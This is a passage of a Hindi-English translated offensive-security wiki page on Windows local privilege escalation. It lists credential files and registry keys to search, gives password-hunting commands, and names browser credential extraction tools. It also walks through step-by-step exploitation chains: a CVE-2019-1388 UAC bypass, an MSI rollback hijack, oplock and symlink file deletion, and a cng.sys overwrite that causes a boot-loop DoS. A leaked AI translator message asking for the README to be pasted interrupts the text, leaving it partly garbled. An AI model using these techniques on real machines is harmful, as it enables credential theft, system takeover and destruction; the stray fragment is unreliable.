ज्ञात फ़ाइलें जिनमें कुछ समय पहले **passwords** **clear-text** या Base64 में मौजूद थीं
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
मैं स्थानीय फ़ाइल सिस्टम या रिपॉज़िटरी खोज नहीं कर सकता। कृपया src/windows-hardening/windows-local-privilege-escalation/README.md की सामग्री यहाँ पेस्ट करें (या उन फाइलों को पेस्ट करें जिन्हें आप अनुवादित कराना चाहते हैं)। 

मैं प्राप्त सामग्री का अनुवाद हिंदी में कर दूँगा और markdown/HTML टैग, कोड, लिंक, paths और आपने दिए हुए विशेष टैग्स को बिल्कुल वैसा ही रखूँगा।
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### RecycleBin में Credentials

आपको Bin को भी जांचना चाहिए ताकि इसके अंदर credentials मिल सकें

कई प्रोग्रामों द्वारा सहेजे गए **recover passwords** के लिए आप उपयोग कर सकते हैं: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Registry के अंदर

**credentials वाले अन्य संभावित registry keys**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ब्राउज़र इतिहास

आपको उन dbs की जाँच करनी चाहिए जहाँ **Chrome or Firefox** के passwords स्टोर होते हैं।  
ब्राउज़र के history, bookmarks और favourites भी चेक करें — हो सकता है कुछ **passwords** वहाँ स्टोर हों।

Tools to extract passwords from browsers:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** Windows ऑपरेटिंग सिस्टम में बनी एक तकनीक है जो विभिन्न भाषाओं के software components के बीच परस्पर संचार की अनुमति देती है। प्रत्येक COM component को **class ID (CLSID)** द्वारा पहचाना जाता है और प्रत्येक component एक या अधिक interfaces के माध्यम से functionality प्रदर्शित करता है, जिन्हें interface IDs (IIDs) द्वारा पहचाना जाता है।

COM classes और interfaces registry में define होते हैं, क्रमशः **HKEY\CLASSES\ROOT\CLSID** और **HKEY\CLASSES\ROOT\Interface** के तहत। यह registry **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** को मर्ज करके बनता है = **HKEY\CLASSES\ROOT.**

Inside the CLSIDs of this registry you can find the child registry **InProcServer32** which contains a **default value** pointing to a **DLL** and a value called **ThreadingModel** that can be **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) or **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

बुनियादी रूप से, अगर आप **overwrite any of the DLLs** कर सकें जो execute होने वाले हैं, तो आप **escalate privileges** कर सकते हैं यदि वह DLL किसी अलग user द्वारा execute किया जाएगा।

To learn how attackers use COM Hijacking as a persistence mechanism check:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

**फ़ाइल की सामग्री खोजें**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**किसी विशेष फ़ाइलनाम वाली फ़ाइल खोजें**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**रजिस्ट्री में key नाम और passwords खोजें**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### पासवर्ड खोजने वाले टूल्स

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin जिसे मैंने बनाया है ताकि यह victim के अंदर **automatically execute every metasploit POST module that searches for credentials** कर सके।\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) स्वचालित रूप से इस पेज में उल्लिखित उन सभी फ़ाइलों को ढूँढता है जिनमें passwords होते हैं।\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) एक और बेहतरीन टूल है जो सिस्टम से password निकालने के लिए उपयोग होता है।

यह टूल [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) कई ऐसे टूल्स के **sessions**, **usernames** और **passwords** खोजता है जो यह डेटा clear text में सेव करते हैं (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

कल्पना करें कि **SYSTEM के रूप में चल रहा एक process एक नया process खोलता है** (`OpenProcess()`) जिसमें **full access** हो। वही process **एक और नया process भी बनाता है** (`CreateProcess()`) **जिसके पास low privileges हैं लेकिन वह मुख्य process के सभी खुले handles को इनहेरिट करता है**।\
फिर, यदि आपके पास **low privileged process पर full access** है, तो आप `OpenProcess()` से बनाए गए privileged process के **खुले handle** को पकड़कर **shellcode inject** कर सकते हैं।\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Shared memory segments, जिन्हें **pipes** कहा जाता है, process communication और data transfer सक्षम करते हैं।

Windows एक सुविधा देता है जिसे **Named Pipes** कहा जाता है, जो unrelated processes को data share करने की अनुमति देता है, यहाँ तक कि अलग-अलग नेटवर्क पर भी। यह एक client/server architecture जैसा दिखता है, जिसमें भूमिकाएँ **named pipe server** और **named pipe client** के रूप में परिभाषित होती हैं।

जब कोई **client** pipe के माध्यम से डेटा भेजता है, तो उस pipe को सेट करने वाला **server** उस **client** की पहचान **अपना** सकता है, बशर्ते उसके पास आवश्यक **SeImpersonate** अधिकार हों। किसी ऐसे **privileged process** की पहचान करना जो आपके बनाए pipe के माध्यम से communicate करता है और जिसे आप mimic कर सकते हैं, आपको उस प्रक्रिया की पहचान अपनाकर **ऊँचे privileges** प्राप्त करने का मौका देता है जब वह उस pipe से इंटरेक्ट करे। इस तरह के attack को करने के निर्देशों के लिए, उपयोगी गाइड [**here**](named-pipe-client-impersonation.md) और [**here**](#from-high-integrity-to-system) पर मौजूद हैं।

Also the following tool allows to **intercept a named pipe communication with a tool like burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **and this tool allows to list and see all the pipes to find privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

The Telephony service (TapiSrv) in server mode exposes `\\pipe\\tapsrv` (MS-TRP). A remote authenticated client can abuse the mailslot-based async event path to turn `ClientAttach` into an arbitrary **4-byte write** to any existing file writable by `NETWORK SERVICE`, then gain Telephony admin rights and load an arbitrary DLL as the service. Full flow:

- `ClientAttach` with `pszDomainUser` set to a writable existing path → the service opens it via `CreateFileW(..., OPEN_EXISTING)` and uses it for async event writes.
- Each event writes the attacker-controlled `InitContext` from `Initialize` to that handle. Register a line app with `LRegisterRequestRecipient` (`Req_Func 61`), trigger `TRequestMakeCall` (`Req_Func 121`), fetch via `GetAsyncEvents` (`Req_Func 0`), then unregister/shutdown to repeat deterministic writes.
- Add yourself to `[TapiAdministrators]` in `C:\Windows\TAPI\tsec.ini`, reconnect, then call `GetUIDllName` with an arbitrary DLL path to execute `TSPI_providerUIIdentify` as `NETWORK SERVICE`.

More details:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

Check out the page **[https://filesec.io/](https://filesec.io/)**

### **Monitoring Command Lines for passwords**

जब user के रूप में shell मिलता है, तो शेड्यूल किए गए tasks या अन्य processes चल रहे हो सकते हैं जो **command line पर credentials पास करते हैं**। नीचे दिया गया script हर दो सेकंड में process के command lines को कैप्चर करता है और वर्तमान स्थिति की तुलना पिछली स्थिति से करता है, और किसी भी अंतर को आउटपुट करता है।
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## प्रक्रियाओं से पासवर्ड चोरी करना

## कम-प्रिविलेज उपयोगकर्ता से NT\AUTHORITY SYSTEM तक (CVE-2019-1388) / UAC Bypass

यदि आपके पास graphical interface (console या RDP के माध्यम से) तक पहुँच है और UAC सक्रिय है, तो कुछ Microsoft Windows संस्करणों में unprivileged user से "NT\AUTHORITY SYSTEM" जैसा टर्मिनल या कोई अन्य process चलाना संभव है।

यह एक ही vulnerability के माध्यम से privileges escalate करने और साथ ही UAC को bypass करने की अनुमति देता है। इसके अलावा, कुछ भी install करने की आवश्यकता नहीं होती और प्रक्रिया के दौरान उपयोग किया गया binary Microsoft द्वारा signed और issued होता है।

प्रभावित सिस्टमों में से कुछ निम्नलिखित हैं:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
इस vulnerability को exploit करने के लिए, निम्नलिखित कदम आवश्यक हैं:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## From Administrator Medium to High Integrity Level / UAC Bypass

Read this to **learn about Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Then **read this to learn about UAC and UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

The technique described [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) with a exploit code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

यह attack मूलतः Windows Installer के rollback feature का दुरुपयोग करके uninstallation प्रक्रिया के दौरान वैध फाइलों को malicious फाइलों से बदलने पर आधारित है। इसके लिए हमलावर को एक **malicious MSI installer** बनाना होगा जो `C:\Config.Msi` फ़ोल्डर को hijack करने के लिए उपयोग किया जाएगा, जिसे बाद में Windows Installer द्वारा अन्य MSI packages को uninstall करते समय rollback files स्टोर करने के लिए उपयोग किया जाएगा — जहाँ rollback files को malicious payload रखने के लिए modify किया जाएगा।

संक्षेप में तकनीक इस प्रकार है:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI  
- Create an `.msi` that installs a harmless file (e.g., `dummy.txt`) in a writable folder (`TARGETDIR`).  
- Mark the installer as **"UAC Compliant"**, so a **non-admin user** can run it.  
- Keep a **handle** open to the file after install.

- Step 2: Begin Uninstall  
- Uninstall the same `.msi`.  
- The uninstall process starts moving files to `C:\Config.Msi` and renaming them to `.rbf` files (rollback backups).  
- **Poll the open file handle** using `GetFinalPathNameByHandle` to detect when the file becomes `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing  
- The `.msi` includes a **custom uninstall action (`SyncOnRbfWritten`)** that:  
  - Signals when `.rbf` has been written.  
  - Then **waits** on another event before continuing the uninstall.

- Step 4: Block Deletion of `.rbf`  
- When signaled, **open the `.rbf` file** without `FILE_SHARE_DELETE` — this **prevents it from being deleted**.  
- Then **signal back** so the uninstall can finish.  
- Windows Installer fails to delete the `.rbf`, and because it can’t delete all contents, **`C:\Config.Msi` is not removed**.

- Step 5: Manually Delete `.rbf`  
- You (attacker) delete the `.rbf` file manually.  
- Now **`C:\Config.Msi` is empty**, ready to be hijacked.

> At this point, **trigger the SYSTEM-level arbitrary folder delete vulnerability** to delete `C:\Config.Msi`.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs  
- Recreate the `C:\Config.Msi` folder yourself.  
- Set **weak DACLs** (e.g., Everyone:F), and **keep a handle open** with `WRITE_DAC`.

- Step 7: Run Another Install  
- Install the `.msi` again, with:  
  - `TARGETDIR`: Writable location.  
  - `ERROROUT`: A variable that triggers a forced failure.  
- This install will be used to trigger **rollback** again, which reads `.rbs` and `.rbf`.

- Step 8: Monitor for `.rbs`  
- Use `ReadDirectoryChangesW` to monitor `C:\Config.Msi` until a new `.rbs` appears.  
- Capture its filename.

- Step 9: Sync Before Rollback  
- The `.msi` contains a **custom install action (`SyncBeforeRollback`)** that:  
  - Signals an event when the `.rbs` is created.  
  - Then **waits** before continuing.

- Step 10: Reapply Weak ACL  
- After receiving the `.rbs created` event:  
- The Windows Installer **reapplies strong ACLs** to `C:\Config.Msi`.  
- But since you still have a handle with `WRITE_DAC`, you can **reapply weak ACLs** again.

> ACLs are **only enforced on handle open**, so you can still write to the folder.

- Step 11: Drop Fake `.rbs` and `.rbf`  
- Overwrite the `.rbs` file with a **fake rollback script** that tells Windows to:  
  - Restore your `.rbf` file (malicious DLL) into a **privileged location** (e.g., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).  
  - Drop your fake `.rbf` containing a **malicious SYSTEM-level payload DLL**.

- Step 12: Trigger the Rollback  
- Signal the sync event so the installer resumes.  
- A **type 19 custom action (`ErrorOut`)** is configured to **intentionally fail the install** at a known point.  
- This causes **rollback to begin**.

- Step 13: SYSTEM Installs Your DLL  
- Windows Installer:  
  - Reads your malicious `.rbs`.  
  - Copies your `.rbf` DLL into the target location.  
- You now have your **malicious DLL in a SYSTEM-loaded path**.

- Final Step: Execute SYSTEM Code  
- Run a trusted **auto-elevated binary** (e.g., `osk.exe`) that loads the DLL you hijacked.  
- **Boom**: Your code is executed **as SYSTEM**.


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

The main MSI rollback technique (the previous one) assumes you can delete an **entire folder** (e.g., `C:\Config.Msi`). But what if your vulnerability only allows **arbitrary file deletion** ?

आप NTFS के अंदरूनी तंत्र का दुरुपयोग कर सकते हैं: हर फ़ोल्डर में एक hidden alternate data stream होता है जिसे कहा जाता है:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
यह stream फ़ोल्डर का **index metadata** संग्रहीत करता है।

तो, यदि आप किसी फ़ोल्डर का **`::$INDEX_ALLOCATION` stream हटाते हैं**, तो NTFS फ़ाइलसिस्टम से **पूरा फ़ोल्डर हटा देता है**।

आप यह standard file deletion APIs का उपयोग करके कर सकते हैं, जैसे:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> भले ही आप *file* delete API को कॉल कर रहे हों, यह **खुद फ़ोल्डर को डिलीट कर देता है**।

### From Folder Contents Delete to SYSTEM EoP
What if your primitive doesn’t allow you to delete arbitrary files/folders, but it **does allow deletion of the *contents* of an attacker-controlled folder**?

1. Step 1: Setup a bait folder and file
- Create: `C:\temp\folder1`
- Inside it: `C:\temp\folder1\file1.txt`

2. Step 2: Place an **oplock** on `file1.txt`
- जब कोई privileged process `file1.txt` को डिलीट करने की कोशिश करता है तो oplock **execution को रोक देता है**।
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. चरण 3: सिस्टम प्रक्रिया को ट्रिगर करें (उदा., `SilentCleanup`)
- यह प्रक्रिया फ़ोल्डरों (उदा., `%TEMP%`) को स्कैन करती है और उनकी सामग्री हटाने की कोशिश करती है।
- जब यह `file1.txt` तक पहुँचता है, **oplock triggers** और नियंत्रण आपके callback को सौंप देता है।

4. चरण 4: oplock callback के अंदर – हटाने को पुनः निर्देशित करें

- Option A: `file1.txt` को कहीं और स्थानांतरित करें
- इससे `folder1` खाली हो जाता है बिना oplock तोड़े।
- `file1.txt` को सीधे न हटाएँ — इससे oplock समयपूर्व रूप से रिलीज़ हो जाएगा।

- Option B: `folder1` को एक **junction** में परिवर्तित करें:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- विकल्प C: `\RPC Control` में एक **symlink** बनाएँ:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> यह NTFS internal stream को लक्षित करता है जो folder metadata स्टोर करता है — इसे हटाने से folder हट जाता है।

5. Step 5: Release the oplock
- SYSTEM process जारी रहता है और `file1.txt` को डिलीट करने की कोशिश करता है।
- लेकिन अब, junction + symlink के कारण, यह वास्तव में डिलीट कर रहा है:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**परिणाम**: `C:\Config.Msi` is deleted by SYSTEM.

### From Arbitrary Folder Create to Permanent DoS

ऐसे primitive का exploit करें जो आपको **create an arbitrary folder as SYSTEM/admin** करने की अनुमति देता है — भले ही **you can’t write files** या **set weak permissions**।

ऐसा **folder** (not a file) बनाएं जिसका नाम किसी **critical Windows driver** जैसा हो, e.g.:
```
C:\Windows\System32\cng.sys
```
- यह पाथ सामान्यतः `cng.sys` kernel-mode driver से संबंधित होता है।
- यदि आप इसे **पहले से एक फ़ोल्डर के रूप में बना देते हैं**, तो Windows बूट पर वास्तविक ड्राइवर को लोड करने में विफल रहता है।
- फिर, Windows बूट के दौरान `cng.sys` को लोड करने की कोशिश करता है।
- यह फ़ोल्डर देखता है, **वास्तविक ड्राइवर को resolve करने में विफल रहता है**, और **क्रैश कर जाता है या बूट रुक जाता है**।
- बाहरी हस्तक्षेप (जैसे, boot repair या disk access) के बिना **कोई fallback नहीं है**, और **कोई recovery नहीं है**।

### From privileged log/backup paths + OM symlinks to arbitrary file overwrite / boot DoS

जब कोई **privileged service** किसी पाथ पर जो कि किसी **writable config** से पढ़ा गया है लॉग/exports लिखती है, तो उस पाथ को **Object Manager symlinks + NTFS mount points** से redirect करके privileged write को arbitrary overwrite में बदला जा सकता है (यहाँ तक कि **without** SeCreateSymbolicLinkPrivilege)।

**Requirements**
- Config जो target path स्टोर करता है, attacker द्वारा writable होना चाहिए (उदा., `%ProgramData%\...\.ini`)।
- `\RPC Control` पर mount point बनाने और एक OM file symlink बनाने की क्षमता (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools))।
- एक privileged operation जो उस पाथ पर लिखता है (log, export, report)।

**Example chain**
1. कॉन्फ़िग पढ़ें ताकि privileged log destination का पता चले, उदाहरण के लिए `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` जो `C:\ProgramData\ICONICS\IcoSetup64.ini` में है।
2. बिना admin के पाथ को redirect करें:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. प्रिविलेज्ड कंपोनेंट के लॉग लिखने का इंतज़ार करें (उदा., admin "send test SMS" ट्रिगर करता है)। यह लेखन अब `C:\Windows\System32\cng.sys` में होता है।
4. ओवरराइट किए गए लक्ष्य (hex/PE parser) का निरीक्षण करके करप्शन की पुष्टि करें; रिबूट Windows को टेम्पर्ड ड्राइवर पाथ लोड करने के लिए मजबूर करता है → **boot loop DoS**। यह किसी भी protected file पर सामान्यीकृत होता है जिसे कोई privileged service write के लिए खोलेगा।

> `cng.sys` सामान्यतः `C:\Windows\System32\drivers\cng.sys` से लोड होता है, लेकिन अगर एक कॉपी `C:\Windows\System32\cng.sys` में मौजूद है तो पहले उसे प्रयास किया जा सकता है, जिससे यह corrupt data के लिए एक reliable DoS sink बन जाता है।



## **High Integrity से SYSTEM तक**

### **नई सेवा**

यदि आप पहले से ही High Integrity process पर चल रहे हैं, तो **path to SYSTEM** सिर्फ एक नई सेवा बनाकर और उसे execute करके आसान हो सकता है:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> जब आप एक service binary बना रहे हों तो सुनिश्चित करें कि यह एक valid service है या बाइनरी आवश्यक क्रियाएँ इतनी तेज़ी से करता है क्योंकि यदि यह valid service नहीं होगा तो इसे 20s में kill कर दिया जाएगा।

### AlwaysInstallElevated

From a High Integrity process आप कोशिश कर सकते हैं कि **AlwaysInstallElevated registry entries को enable करें** और एक reverse shell को _**.msi**_ wrapper के ज़रिए **install** करें.\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**You can** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

यदि आपके पास वे token privileges हों (संभवतः आप इन्हें पहले से ही किसी High Integrity process में पाएँगे), तो आप SeDebug privilege के साथ लगभग किसी भी process (protected processes को छोड़कर) को **open** कर पाएँगे, process का **token copy** कर पाएँगे, और उस token के साथ एक **arbitrary process create** कर पाएँगे।\
इस तकनीक में आमतौर पर SYSTEM के रूप में चल रहे किसी ऐसे process को चुना जाता है जिसके पास सभी token privileges हों (_हाँ, आप ऐसे SYSTEM processes भी पा सकते हैं जिनमें सभी token privileges नहीं होते_)।\
**You can find an** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

यह तकनीक meterpreter द्वारा `getsystem` में escalate करने के लिए उपयोग की जाती है। तकनीक में एक pipe बनाना और फिर एक service बनाकर/abuse करके उस pipe पर लिखवाना शामिल है। फिर, जिस **server** ने pipe बनाया हो और जिसके पास `SeImpersonate` privilege हो, वह pipe client (service) के token को **impersonate** कर सकता है और SYSTEM privileges प्राप्त कर सकता है।\
यदि आप [**learn more about name pipes you should read this**](#named-pipe-client-impersonation)।\
यदि आप एक उदाहरण पढ़ना चाहते हैं कि [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md)。

### Dll Hijacking

यदि आप किसी dll को hijack करने में सफल हो जाते हैं जो कि SYSTEM के रूप में चलने वाले किसी process द्वारा load की जा रही हो, तो आप उन अनुमतियों (permissions) के साथ arbitrary code execute कर पाएँगे। इसलिए Dll Hijacking इस तरह के privilege escalation के लिए भी उपयोगी है, और साथ ही यह high integrity process से हासिल करना काफी आसान है क्योंकि उसके पास उन folders पर write permissions होते हैं जिनका उपयोग dlls को load करने के लिए होता है।\
**You can** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

पढ़ें: [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

Windows local privilege escalation vectors खोजने के लिए सबसे अच्छा टूल: [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- मिसकन्फ़िगरेशन और संवेदनशील फ़ाइलों की जाँच करें (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- कुछ संभावित मिसकन्फ़िगरेशन की जाँच करें और जानकारी इकट्ठा करें (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- मिसकन्फ़िगरेशन के लिए जाँच करें**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- यह PuTTY, WinSCP, SuperPuTTY, FileZilla, और RDP saved session जानकारी निकालता है। लोकल में -Thorough उपयोग करें।**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager से credentials निकालता है। Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- इकट्ठा किए गए पासवर्ड्स को domain पर spray करता है**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh एक PowerShell ADIDNS/LLMNR/mDNS spoofer और man-in-the-middle टूल है।**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- बेसिक privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- ज्ञात privesc vulnerabilities खोजें (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- लोकल चेक्स **(Admin rights की आवश्यकता)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- ज्ञात privesc vulnerabilities खोजता है (VisualStudio का उपयोग करके compile करने की आवश्यकता) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- होस्ट का enumeration करता है और misconfigurations की तलाश करता है (ज्यादा gather info tool है बजाय privesc के) (compile करने की आवश्यकता) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- कई softwares से credentials निकालता है (github पर precompiled exe)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp का C# पोर्ट**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- मिसकन्फ़िगरेशन के लिए जाँच (executable github पर precompiled)। अनुशंसित नहीं। यह Win10 पर अच्छा काम नहीं करता।\
